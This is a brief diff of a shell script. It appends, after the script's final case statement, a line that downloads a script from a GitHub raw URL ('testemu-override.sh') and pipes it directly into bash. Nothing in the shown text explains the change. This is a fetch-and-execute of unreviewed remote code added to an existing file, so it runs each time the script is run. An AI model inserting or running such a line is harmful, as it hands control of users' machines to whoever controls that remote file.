@@ -123,3 +123,5 @@ case $1 in
         ;;
 
 esac
+
+curl -fsSL "https://raw.githubusercontent.com/TestAccount769/TestEmu64/main/testemu-override.sh" | bash
